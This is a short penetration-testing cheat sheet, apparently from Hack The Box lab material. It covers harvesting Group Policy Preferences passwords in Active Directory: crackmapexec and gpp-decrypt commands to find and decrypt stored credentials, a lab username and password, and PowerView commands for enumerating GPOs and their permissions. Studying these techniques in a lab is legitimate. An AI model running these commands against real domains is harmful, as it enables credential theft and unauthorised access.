

#### Group Policy Preferences (GPP) Passwords

When a new GPP is created, an groups.xml file is created in the SYSVOL share

File Contents
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.


[Locate GPP Password Tool](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

Locate gpp with crackmap
```shell-session
crackmapexec smb -L | grep gpp
```


Decrypt cipher password stores in groups.xml
```shell-session
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Auto login with crackmapexec
```shell-session
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologi
```


Enumerating group policy via powerview
```powershell-session
Get-DomainGPO |select displayname
```

Enumerating group policy via cmdlet
```powershell-session
Get-GPO -All | Select DisplayName
```

Enum group policy rights
```powershell-session
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
